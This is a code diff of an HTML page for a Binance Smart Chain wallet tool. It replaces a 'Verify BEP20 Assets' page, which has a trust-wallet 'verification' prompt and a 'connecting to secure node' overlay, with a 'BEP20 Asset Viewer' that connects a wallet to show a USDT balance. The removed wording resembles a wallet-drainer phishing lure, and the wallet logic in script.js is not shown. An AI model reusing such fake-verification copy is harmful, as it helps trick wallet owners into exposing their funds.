@@ -3,41 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Asset Verification | Secure Node</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
-    <style>
-        body { margin: 0; font-family: 'Inter', sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .card { background: #1e2329; padding: 35px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 100%; max-width: 360px; z-index: 1; }
-        h2 { color: #f0b90b; margin-bottom: 15px; }
-        p { color: #929aa5; font-size: 14px; margin-bottom: 30px; }
-        .btn { background: #f0b90b; color: #000; border: none; padding: 16px; width: 100%; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; }
-        
-        /* Loading Overlay */
-        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(11, 14, 17, 0.95); z-index: 999; flex-direction: column; justify-content: center; align-items: center; }
-        .spinner { width: 50px; height: 50px; border: 5px solid #333; border-top: 5px solid #f0b90b; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
-        #loading-text { font-size: 18px; color: #f0b90b; font-weight: bold; }
-        #sub-text { font-size: 12px; color: #929aa5; margin-top: 10px; }
-        
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+    <title>Asset Viewer | Secure Node</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/4.1.1/web3.min.js"></script>
 </head>
 <body>
 
-    <div class="card">
-        <h2>Verify BEP20 Assets</h2>
-        <p>Verify your trust wallet assets for a secure snapshot of your Binance Smart Chain assets.</p>
-        <button id="nextBtn" class="btn">Verify Assets</button>
-    </div>
+    <div class="container">
+        <div class="card" id="main-card">
+            <h2>BEP20 Asset Viewer</h2>
+            <p>Connect your wallet to view your current Binance Smart Chain (BSC) token balances safely.</p>
+            
+            <button id="connectBtn">Connect Wallet</button>
 
-    <div id="overlay">
-        <div class="spinner"></div>
-        <div id="loading-text">Initializing...</div>
-        <div id="sub-text">Connecting to secure node...</div>
+            <div id="status-container" style="display: none;">
+                <div class="spinner"></div>
+                <p id="status-text">Initializing...</p>
+            </div>
+
+            <div id="results" style="display: none;">
+                <hr>
+                <p><strong>Connected Address:</strong><br><span id="userAddr"></span></p>
+                <div class="balance-box">
+                    <span>USDT Balance:</span>
+                    <span id="usdtBalance">0.00</span>
+                </div>
+            </div>
+        </div>
     </div>
 
     <script src="script.js"></script>
 </body>
 </html>
-
-
-
